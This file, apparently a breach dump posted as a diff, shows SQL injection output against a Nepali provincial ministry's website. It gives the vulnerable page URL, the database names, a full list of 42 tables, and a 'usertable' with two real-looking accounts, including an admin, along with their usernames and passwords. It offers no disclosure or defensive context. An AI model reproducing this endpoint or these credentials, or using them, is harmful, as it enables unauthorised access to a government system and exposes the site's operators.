@@ -1,0 +1,74 @@
+.gov government
+
+.np Nepal
+
+Ministry of Economic Affairs and Projects
+
+Government of Province Lumbini Pradesh 
+
+Ministry of Economic Affairs and Planning 
+
+Mukaam: Butwal,Nepal 
+
+http://moeap.lumbini.gov.np/ne/content.php?id=3
+
+available databases [2]:                                                                                                                                             
+[+] information_schema
+[+] moeaplum_dbase
+
+Database: moeaplum_dbase                                                                                                                                             
+[42 tables]
++------------------+
+| gallery          |
+| gallerydetails   |
+| hitcounter       |
+| rightphoto       |
+| tblbanner        |
+| tblbhuktani      |
+| tblbul           |
+| tblcomplaints    |
+| tblcontacts      |
+| tbldivision      |
+| tbldownloadgroup |
+| tbldownloads     |
+| tblevents        |
+| tblfaq           |
+| tblfaq_cat       |
+| tblfcemails      |
+| tblfeedbacks     |
+| tblfooter        |
+| tblfy            |
+| tblgrantgroup    |
+| tblgrants        |
+| tblicons         |
+| tblindex         |
+| tblindexeng      |
+| tbljingle        |
+| tbllastupdate    |
+| tbllinks         |
+| tbllinks2        |
+| tblmain          |
+| tblmenu          |
+| tblnews          |
+| tblnomination    |
+| tblnotice        |
+| tblnoticegroup   |
+| tblpreport       |
+| tblreport        |
+| tblslidingimage  |
+| tblsplash        |
+| tbluploads       |
+| tblvideo         |
+| usertable        |
+| whoiswho         |
++------------------+
+
+Database: moeaplum_dbase                                                                                                                                             
+Table: usertable
+[2 entries]
++----------+-----------+-----------------+
+| fullname | usern     | userp           |
++----------+-----------+-----------------+
+| admin    | admin@123 | %.i?G_$MD@f+moe |
+| <blank>  | account   | account@123#    |
++----------+-----------+-----------------+
